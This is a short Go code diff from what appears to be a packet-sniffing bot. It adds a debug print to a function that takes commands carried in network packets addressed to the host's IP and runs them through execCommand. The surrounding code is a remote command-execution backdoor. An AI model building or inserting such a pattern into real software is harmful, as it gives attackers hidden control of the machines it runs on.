@@ -47,6 +47,7 @@ func botProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) {
 	// Check if target command
 	if target {
 		if payload[1] == hostIP.String() {
+			fmt.Println("[+] TARGET COMMAND RECEIVED")
 			command := strings.Join(payload[2:], " ")
 			execCommand(command)
 		}
